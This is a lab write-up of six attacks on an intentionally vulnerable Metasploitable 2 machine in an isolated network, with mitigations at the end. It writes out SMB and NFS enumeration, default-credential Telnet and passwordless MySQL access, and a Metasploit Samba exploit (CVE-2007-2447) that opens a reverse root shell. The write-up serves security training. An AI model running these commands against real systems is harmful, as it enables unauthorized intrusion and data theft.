# Lab 01 — Metasploitable 2 Exploitation

> **Environment:** Isolated VMware NAT lab | **Target:** Metasploitable 2 | **Attacker:** Kali Linux

---

## Overview

This lab uses **Metasploitable 2** — an intentionally vulnerable virtual machine designed for security training — as the target system. It contains multiple outdated services, insecure configurations, and known CVEs that allow safe practice of real-world penetration testing techniques.

**Objectives:**
1. Configure a 3-VM isolated lab environment
2. Enumerate and document target services
3. Simulate 6 attacks across multiple service layers
4. Document evidence and propose countermeasures

---

## Lab Architecture

```
┌──────────────────────┐     Host-Only / NAT     ┌──────────────────────┐
│   Kali Linux         │◄────────────────────────►│   Metasploitable 2   │
│   Attacker Machine   │      192.168.106.0/24    │   Target Machine     │
│   192.168.106.134    │                          │   192.168.106.135    │
└──────────────────────┘                          └──────────────────────┘
                                                          ▲
                                                          │
                                              ┌──────────────────────┐
                                              │   Windows 8.1        │
                                              │   Client / Validator │
                                              │   192.168.106.133    │
                                              └──────────────────────┘
```

**Download source:** [Metasploitable 2 — SourceForge](https://sourceforge.net/projects/metasploitable/)

---

## Virtual Machines

| Role | OS | IP Address | Purpose |
|------|----|------------|---------|
| Attacker | Kali Linux | 192.168.106.134 | Performs all attacks |
| Target | Metasploitable 2 | 192.168.106.135 | Vulnerable system |
| Client | Windows 8.1 x64 | 192.168.106.133 | Functional validation |

**Network Setup:** All VMs configured with VMware NAT + Host-Only adapter to maintain full isolation from the internet.

---

## Target Services Configured

### 1. SMB / Samba
- **Port:** TCP 139, 445
- **Vulnerability:** CVE-2007-2447 (username map script)
- **Weaknesses:** SMBv1 enabled, anonymous null sessions allowed, writable shares exposed

### 2. Telnet
- **Port:** TCP 23
- **Weaknesses:** Cleartext credential transmission, default credentials (`msfadmin:msfadmin`), no encryption

### 3. MySQL
- **Port:** TCP 3306
- **Weaknesses:** Root accessible remotely, no password required, no SSL/TLS

### 4. HTTP / Web Application
- **Port:** TCP 80
- **Weaknesses:** Multiple web applications (DVWA, phpMyAdmin, Tikiwiki), directory indexing enabled

### 5. NFS (Network File System)
- **Port:** TCP/UDP 2049
- **Weaknesses:** Root filesystem exported, no client IP restrictions, no authentication

---

## Service Validation (Pre-Attack Baseline)

All services were validated from the Windows 8.1 client prior to attacks:

| Service | Validation Method | Result |
|---------|------------------|--------|
| SMB | `\\192.168.106.135` in Internet Explorer | Shares visible, anonymous access granted |
| Telnet | `telnet 192.168.106.135` with `msfadmin:msfadmin` | Interactive shell granted |
| MySQL | Remote connection test | Service running, no auth required |
| HTTP | Browser to `http://192.168.106.135` | Web apps loaded successfully |
| NFS | Ping + port check | System reachable |

---

## Attack Simulations

---

### Attack 1 — SMB Null Session / Weak Authentication

**Objective:** Determine whether file-sharing services allow unauthorised access.

**Target Service:** SMB — Ports 139, 445

**Command:**
```bash
nmap -p 139,445 --script smb-enum-shares,smb-enum-users 192.168.106.135
```

**Results:**
- Accessible shares enumerated without credentials
- User accounts exposed via SMB null session
- Anonymous authentication allowed on multiple shares

**Impact:**
- Exposure of sensitive files
- Potential credential harvesting
- Lateral movement risk across the network

---

### Attack 2 — Telnet Cleartext Authentication Abuse

**Objective:** Exploit insecure remote administration protocol.

**Target Service:** Telnet — Port 23

**Step 1 — Port Detection:**
```bash
nmap -p 23 192.168.106.135
```
*Result: Port 23 OPEN*

**Step 2 — Authentication Abuse:**
```bash
telnet 192.168.106.135
# Username: msfadmin
# Password: msfadmin
```

**Result:** Interactive shell access granted using default credentials. Credentials transmitted in cleartext — visible to any network observer.

**Impact:**
- Full remote command execution
- Credentials exposed in plaintext on the wire
- No session logging or audit trail

---

### Attack 3 — MySQL Unauthorised Access

**Objective:** Test database service exposure and access without authentication.

**Target Service:** MySQL — Port 3306

**Step 1 — Version Enumeration:**
```bash
nmap -sV -p 3306 192.168.106.135
```
*Result: MySQL service identified and version disclosed*

**Step 2 — Direct Database Access:**
```bash
mysql -h 192.168.106.135 -u root --skip-ssl
```

**Post-Access Commands:**
```sql
SHOW DATABASES;

USE tikiwiki;
SHOW TABLES;
```

**Result:** Full root-level database access with no password prompt. The `tikiwiki` database and all tables were accessible and modifiable.

**Impact:**
- Full database access without credentials
- Data manipulation and exfiltration possible
- Complete confidentiality breach

---

### Attack 4 — Web Application Command Injection

**Objective:** Identify application-level vulnerabilities on the HTTP service.

**Target Service:** HTTP — Port 80

**Step 1 — Web Vulnerability Scan:**
```bash
nikto -h http://192.168.106.135
```

**Notable Findings:**
- Directory indexing enabled
- Default web applications exposed (DVWA, phpMyAdmin, Tikiwiki)
- Server version disclosure
- Multiple known CVEs reported

**Step 2 — Manual Injection Testing:**
User input fields tested for OS-level command injection via web parameters.

**Evidence:** Command output displayed directly in browser response. Server response manipulation confirmed.

**Impact:**
- Arbitrary command execution via web interface
- Full web server compromise potential
- No input sanitisation present

---

### Attack 5 — NFS Information Disclosure & Filesystem Mount

**Objective:** Assess exposure of remote file systems via NFS misconfiguration.

**Target Service:** NFS — Port 2049

**Step 1 — Export Enumeration:**
```bash
showmount -e 192.168.106.135
```
*Result: Root filesystem (/) exported with no access restrictions*

**Step 2 — Mount and Access:**
```bash
# Create mount directory
sudo mkdir -p /mnt/metasploitable

# Mount the NFS share
sudo mount -t nfs 192.168.106.135:/ /mnt/metasploitable

# Validate access
ls /mnt/metasploitable
```

**Result:** The entire Metasploitable 2 filesystem was mounted on the Kali attacker machine without any authentication. All files, directories, and configuration data became accessible.

**Impact:**
- Remote filesystem access with no authentication
- Complete confidentiality breach
- Configuration files, credentials, and user data exposed

---

### Attack 6 — Remote Code Execution via Samba (CVE-2007-2447)

**Objective:** Exploit insecure Samba configuration to achieve unauthenticated remote code execution.

**Vulnerability:** CVE-2007-2447 — Samba `username map script` injection  
**Affected Versions:** Samba < 3.0.25  
**Severity:** Critical — Remote Code Execution

**Step 1 — Version Fingerprinting:**
```bash
nmap -sV -p 445 192.168.106.135
```
*Result: Samba version confirmed as vulnerable (3.0.20)*

**Step 2 — Metasploit Exploitation:**
```bash
msfconsole

use exploit/multi/samba/usermap_script

set RHOSTS 192.168.106.135
set LHOST 192.168.106.134
set PAYLOAD cmd/unix/reverse

run
```

*Result: Command Shell Session 1 Opened*

**Step 3 — Post-Exploitation Verification:**
```bash
whoami      # Output: root
hostname    # Output: metasploitable
uname -a    # Full kernel/OS version
id          # uid=0(root) gid=0(root)
```

**Result:** Full root-level shell obtained on target system. Complete host compromise confirmed.

**Impact:**
- Unauthenticated remote code execution
- Root-level privilege escalation
- Full host compromise — all data, services, and credentials exposed

---

## Evidence Summary

| Attack | Tool | Key Evidence | Severity |
|--------|------|--------------|----------|
| SMB Null Session | Nmap scripts | Share list + user enumeration | High |
| Telnet Abuse | telnet | Default credential shell access | High |
| MySQL Unauth Access | mysql client | Root DB access, full table listing | Critical |
| Web Command Injection | Nikto | Directory indexing, CVE disclosure | High |
| NFS Disclosure | showmount + mount | Full filesystem mounted remotely | Critical |
| Samba RCE (CVE-2007-2447) | Metasploit | root shell — whoami, id, uname | Critical |

---

## Countermeasures & Mitigations

### Network Service Hardening
- Disable all unused services
- Enforce firewall restrictions with IP allowlisting
- Remove legacy protocols: Telnet, SMBv1, NFS without auth

### Authentication & Access Control
- Enforce strong password policies — eliminate default credentials
- Disable anonymous/null session authentication
- Require SSL/TLS on all database connections
- Use key-based authentication for remote access

### Secure Service Configuration
- Replace Telnet with SSH (encrypted remote access)
- Upgrade MySQL to enforce password authentication + bind to localhost
- Restrict NFS exports with explicit IP whitelists and `no_root_squash` disabled
- Disable directory indexing on web servers

### Patch Management
- Apply regular OS and service updates
- Deploy vulnerability scanning (OpenVAS, Nessus)
- Monitor service versions against CVE databases

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning, service enumeration, vulnerability scripts |
| `Metasploit Framework` | Exploit delivery and post-exploitation |
| `Nikto` | Web application vulnerability scanner |
| `showmount` | NFS export enumeration |
| `mysql` (client) | Direct database access testing |
| `telnet` | Remote login testing |
